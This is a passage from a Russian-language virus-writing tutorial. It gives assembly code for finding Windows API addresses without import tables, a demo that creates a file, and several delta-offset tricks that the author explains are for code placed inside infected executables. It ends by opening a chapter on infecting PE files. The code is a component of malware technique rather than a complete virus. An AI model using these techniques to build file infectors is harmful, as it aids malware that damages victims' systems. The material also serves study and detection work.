&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'FindNextFileA'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'FindClose'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'CreateFileA'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp;</div>
<p>Им соответствуют переменные вида:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">f<span style="color: #339933;">:</span><br/>
_FindFirstFileA <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
_FindNextFileA&nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
_FindClose&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
_CreateFileA&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
&nbsp;</div>
<p>Важно, что между ними взаимнооднозначное соответствие (привет Соломатину О.Д.!). Порядок, тоже сохраняется. Этими свойствами мы и пользуемся при получении адресов. Можно, конечно, обойтись без циклов и соответсвий, но в ассемблере халявы нет, в вирмейкинге тем более.</p>
<p>Ниже приведен код процедуры, которая заполняет соответствующую область адресами нужных <strong>API</strong>-функций:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Процедура GetAPIs</span><br/>
<span style="color: black; font-style: italic;">;Получение адресов всех требуемых API-функций</span><br/>
<span style="color: black; font-style: italic;">;Вход: В edi указатель на массив ASCIIZ строк имен функций</span><br/>
<span style="color: black; font-style: italic;">;В ebx - смещение массива двойных слов которые заполняет функция</span><br/>
<span style="color: black; font-style: italic;">;В ecx - количество функций</span><br/>
<span style="color: black; font-style: italic;">;В esi - база kernel32.dll</span><br/>
<span style="color: black; font-style: italic;">;Выход:заполняются соответствующие поля</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
GetAPIs proc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushad</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; offset NameGetProcAddress<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetGetProcAddress<br/>
NextFunc<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;имя функции</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;база kernel32</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;вызов GetProcAddress</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;помещаем адрес функции в переменную</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;следующая переменная</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;сохраняем счетчик</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">30</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;для цепочечной команды</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ищем 0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repne</span> &nbsp; <span style="color: #00007f; font-weight: bold;">scasb</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; NextFunc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popad</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
GetAPIs endp<br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Конец процедуры GetAPIs</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
&nbsp;</div>
<p>Далее я привожу пример программы которая демонстрирует использование данных методик. Программа просто создает файл с именем "<strong>c:\2.txt</strong>", а потом завершается. Естественно, что адреса <strong>API</strong> функций мы получаем сами. Никаких библиотек импорта, как Вы поняли, не требуется. В файле <strong>Part1.inc</strong> находятся требуемые функции, листинги которых приведены выше. Файл <strong>Part1.inc</strong> можно скачать <a href="Part1.inc">отсюда</a>.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #ff0000;">.386</span><br/>
option casemap<span style="color: #339933;">:</span>none<br/>
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>stdcall<br/>
include f<span style="color: #339933;">:</span>\tools\masm32\include\windows<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br/>
<span style="color: #0000ff; font-weight: bold;">.data</span><br/>
NameGetProcAddress&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;GetProcAddress&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
a &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;c:\\2.txt&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
addres&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; label <span style="color: #0000ff; font-weight: bold;">DWORD</span><br/>
_FindFirstFileA &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
_FindNextFileA&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
_FindClose&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
_CreateFileA&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
_ExitProcess&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
include part1<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br/>
imp<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'FindFirstFileA'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'FindNextFileA'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'FindClose'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'CreateFileA'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'ExitProcess'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetKernelSEH<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetBase<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>offset imp<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>offset addres<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetAPIs<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; FILE_ATTRIBUTE_NORMAL<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; CREATE_NEW<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; offset a<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>_CreateFileA<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>_ExitProcess<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
end &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">start</span><br/>
&nbsp;</div>
<p>Кстати у меня к Вам маленький вопрос уважаемый читатель. Что будет, если мы получим базу не с помощью функции <strong>GetKernelSEH</strong>, а с помощью функции <strong>GetKernelImport</strong>? Ответ: программа глюканет. Вы заметили, что наша программа не пользуется никакими прототипами? Из-за этого у нее нет экспортируемых функций. Но, если Вы будете внедрять код, то этот метод отлично подойдет, т.к. практически все Windows приложения импортируют функции из библиотеки <strong>kernel32.dll</strong>. Кроме такой, листинг которой, приведен выше.</p>
<h3><a name="c18"></a>Дельта смещение</h3>
<p>Это последняя вещь, о которой я хотел Вам рассказать в той главе. Представьте, что Вы заразили файл. Теперь код вируса или его часть находиться в другом exe-файле. Например, возьмем переменную <strong>_CreateFileA</strong>. Она имеет определенное смещение. Смещение это фиксировано. И если код, приведенный выше запишется в другой exe-файл, то это смещение будет уже некорректным. Наша задача сделать так, чтобы смещение не зависело от местоположения кода. Для этого, нам надо узнать по какому смещению находиться наш код. И относительно этого смещения вычислить смещение нашей переменной. Это же относиться и к функциям нашего кода. Дельта смещение - это значение, показывающее на сколько байт сместилось положение нашего кода. Проще говоря дельта-смещение - это адрес где находиться код которые сейчас выполняется. Дельта-смещение вычисляют обычно вначале старта кода вируса.</p>
<p>Вот пример получения дельта-смещения:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; delta<br/>
delta<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span>offset delta<br/>
&nbsp;</div>
<p>После выполнения этого кода в регистре <strong>ebp</strong> находиться дельта смещение. Вот еще несколько способов получения дельта смещения:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">d<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; c1<br/>
x &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
c1<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span>x<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span>offset d<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в EBP - дельта смещение</span><br/>
&nbsp;</div>
<p>Еще один, по типу предыдущего:</p>
<src alng="asm">
d: jmp c1
x db "Hello!!! I'm Crazy Virus",0
c1: lea ebp,x
sub ebp,offset d
sub ebp,2 ;в EBP - дельта смещение
</src>
<p>Вот этот прием от Billy Belcebu:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>old_size_of_infected_file &nbsp; <span style="color: black; font-style: italic;">;используем размер файла, до инфецирования</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp;</div>
<p>И Еще:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">m<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>m<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>offset m&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в EBX - дельта смещение</span><br/>
&nbsp;</div>
<p>На самом деле существует бесконечное число способов получить дельта смещение. Это зависит только от Вашей фантазии и знания языка ассемблер.</p>
<h4><a name="c181"></a>Использование дельта смещения</h4>
<p>Теперь, как пользоваться переменными или функциями. Пусть у нас есть две переменные <strong>X</strong> и <strong>Y</strong>. Пусть дельта смещение находиться в регистре <strong>EBP</strong>, тогда обращение к переменным в Вашем коде будет выглядить следующим образом:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; ...</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">+</span>offset X<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">+</span>offset Y<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; ...</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; x &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;например, переход к нормальной точке входа</span><br/>
X &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DB</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">123</span><br/>
Y &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DW</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
&nbsp;</div>
<p>Т.к. адреса функций помещаются в переменные, то этот способ также можно использовать для вызова функций:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; ...</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">+</span>offset _ExitProcess<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; ...</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; x &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;например, переход к нормальной точке входа</span><br/>
_ExitProcess&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
&nbsp;</div>
<h3><a name="c19"></a>Защита</h3>
<p>В данной главе приводились методы, которые используют очень много вирусов. Этот код типичен. Эврестик просто должен распознавать что-то подобное.</p>
<h3><a name="c1a"></a>Благодарности</h3>
<p>В этом разделе я хочу выразить благодарности людям, которые помогли мне:</p>
<ul>
<li><strong>DayDream/TPOC</strong></li>
<li><strong>Volodya/wasm.ru</strong> - Вы все его знаете, спасибо за поддержку</li>
<li><strong>Aquila/wasm.ru</strong> - твои переводы помогли многим, мне в том числе</li>
<li><strong>Svl/TPOC</strong></li>
<li><strong>_follower/TPOC</strong></li>
<li><strong>Occas'Ion</strong> - спасибо за интересные идеи</li>
<li><strong>z0mbie/29a</strong> - большой respect Тебе</li>
<li><strong>Sars</strong></li>
<li><strong>The Great Zopuh</strong></li>
<li><strong>Slon</strong></li>
<li><strong>NoName</strong></li>
</ul>
<h2><a name="c2"></a>Глава 2: Формат исполняемого файла ОС Windows. PE32 и PE64. Способы заражения исполняемых файлов.</h2>
<h3><a name="c21"></a>Введение</h3>
<p>В этой главе мы исследуем формат исполняемых файлов в операционной системе Windows. Все факты, которые будут касаться этого изложения подходят для ОС Windows XP c установленным SP2. Но большинство фактов распространяются на всю платформу Win32. Я буду рассматривать все поля PE-формата полностью. Я привожу здесь описания используемых структур, для того чтобы Вы могли использовать этот документ и как справочник.</p>
<p>Формат PE (Portable Executable) - это переносимый исполняемый формат файлов. Переносимым он является потому, что он единственный для всех операционных систем Windows(9x,NT). Есть форматы и другие, но для платформы Win32 этот формат является единственным.</p>
<p>PE-формат впервые был использован в ОС Windows 3.1. Он был стандартизирован в 1993 году и базируется на формате COFF (Common Object File Format), который использовался в нескольких UNIX и VMS. Приступим, сначала рассмотрим общий вид PE-файла, чтобы Вы имели представление о нем.</p>
<h3><a name="c22"></a>Общий вид PE-файла</h3>
